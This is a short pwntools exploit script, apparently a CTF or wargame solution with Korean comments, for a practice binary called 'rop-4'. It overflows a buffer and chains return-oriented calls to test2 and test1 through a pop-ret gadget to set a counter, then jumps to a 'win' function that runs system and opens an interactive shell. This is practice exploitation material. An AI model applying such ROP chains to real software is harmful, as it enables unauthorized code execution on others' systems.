from pwn import *

p = process('./rop-4')
elf = ELF('./rop-4')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

# ROPgadget --binary rop1 | grep pop
pop_ret = 0x0804901e

payload = b'A'*0x10 # [ebp-0xc]활용 0xc+4 만큼 'A' 값 넣음 
payload += p32(elf.symbols['test2']) #test2함수에 접근 point값 1 올림 point = 1
payload += p32(elf.symbols['test1']) #test1함수에 접근 point값 쉬프트 연산 
payload += p32(pop_ret) # test1 함수는 인자 값 하나가 필요 -> pop_ret
payload += p32(8) # point = 100
payload += p32(elf.symbols['test2']) # point = 101
payload += p32(elf.symbols['test1']) # point = 10100
payload += p32(pop_ret)
payload += p32(8)
payload += p32(elf.symbols['test2']) # point = 10101
payload += p32(elf.symbols['test1']) # point = 1010100
payload += p32(pop_ret)
payload += p32(8)
payload += p32(elf.symbols['test2']) # point = 1010101
payload += p32(elf.symbols['test1']) # point = 10101010
payload += p32(pop_ret)
payload += p32(4)
payload += p32(elf.symbols['win']) # point 값 비교후 system함수 실행
payload += p32(0xdeadbeef)

p.send(payload)
p.interactive()

